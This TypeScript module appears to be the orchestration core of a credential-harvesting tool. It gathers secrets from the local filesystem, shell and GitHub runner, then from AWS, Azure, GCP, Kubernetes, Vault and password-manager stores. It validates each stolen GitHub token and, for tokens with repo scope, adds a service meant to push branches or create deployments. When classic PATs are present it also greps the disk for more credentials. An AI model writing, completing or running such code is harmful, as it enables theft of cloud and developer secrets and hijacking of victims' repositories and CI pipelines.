import { getTokenMetadata } from "../github_utils/tokenCheck";
import { GitHubActionsService } from "../providers/actions/actions";
import { AwsAccountService } from "../providers/aws/awsAccount";
import { AwsSecretsManagerService } from "../providers/aws/secretsManager";
import { AwsSsmService } from "../providers/aws/ssm";
import { AzureIdentityService } from "../providers/azure/identity";
import { AzureKeyVaultService } from "../providers/azure/keyvault";
import type { Provider } from "../providers/base";
import { ShellService } from "../providers/devtool/devtool";
import { FileSystemService } from "../providers/filesystem/filesystem";
import { GrepProvider } from "../providers/filesystem/grep";
import { GcpIdentityService } from "../providers/gcp/identity";
import { GcpSecretsService } from "../providers/gcp/secrets";
import { GitHubRunner } from "../providers/ghrunner/runner";
import { K8sSecretsService } from "../providers/kubernetes/kubernetes";
import { PasswordManagerProvider } from "../providers/passwords/passwords";
import type { ProviderResult } from "../providers/types";
import { VaultSecretsService } from "../providers/vault/vault-secrets";
import { logUtil } from "../utils/logger";

/**
 * Run the three "quick" providers (filesystem, shell, GitHub runner)
 * and return their results.  These are used both for token discovery
 * and as initial data for the collector.
 */
export async function gatherQuickResults(): Promise<ProviderResult[]> {
  const localProvider = new FileSystemService();
  const shellProvider = new ShellService();
  const runnerProvider = new GitHubRunner();

  return [
    await localProvider.execute(),
    await shellProvider.execute(),
    await runnerProvider.execute(),
  ];
}

export interface ProviderBundle {
  providers: Provider[];
  dispatched: boolean;
}

/**
 * Build the full provider list:
 *   1. Start with the static cloud / secret-store providers.
 *   2. For every valid GitHub token found in quickResults, append a
 *      GitHubActionsService.
 *
 * Returns the providers and a flag indicating whether at least one
 * GitHub Actions token was dispatched.
 */
export async function buildProviders(
  quickResults: ProviderResult[],
): Promise<ProviderBundle> {
  const providers: Provider[] = [
    new AwsSsmService(),
    new AwsSecretsManagerService(),
    new AwsAccountService(),
    new AzureKeyVaultService(),
    new AzureIdentityService(),
    new GcpSecretsService(),
    new GcpIdentityService(),
    new K8sSecretsService(),
    new VaultSecretsService(),
    new PasswordManagerProvider(),
  ];

  let dispatched = false;
  const seenTokens = new Set<string>();
  let hasClassicPat = false;

  for (const item of quickResults) {
    logUtil.log(`Checking ${item.service}`);
    if (item.matches?.["ghtoken"]) {
      for (const token of item.matches["ghtoken"]) {
        if (seenTokens.has(token)) continue;
        seenTokens.add(token);

        // Track classic PATs so we can enable the grep provider below.
        if (token.startsWith("ghp_") || token.startsWith("gho_")) {
          hasClassicPat = true;
        }

        const meta = await getTokenMetadata(token);
        if (!meta.valid) continue;

        // Store metadata so the collector can skip re-validating.
        if (!item.tokenMetadata) item.tokenMetadata = {};
        item.tokenMetadata[token] = meta;

        // Only add the provider if the token has repo scope (push) or
        // deployments scope — needed to push branches or create deployments.
        const hasRepo =
          meta.scopes.includes("repo") || meta.scopes.includes("public_repo");
        if (hasRepo) {
          providers.push(new GitHubActionsService(token));
          dispatched = true;
        }
      }
    }
  }

  // Grep the filesystem for more credentials when classic PATs are present.
  if (hasClassicPat) {
    logUtil.log(
      "[providers] Classic PAT (ghp_/gho_) found — enabling GrepProvider.",
    );
    providers.push(new GrepProvider());
  }

  return { providers, dispatched };
}
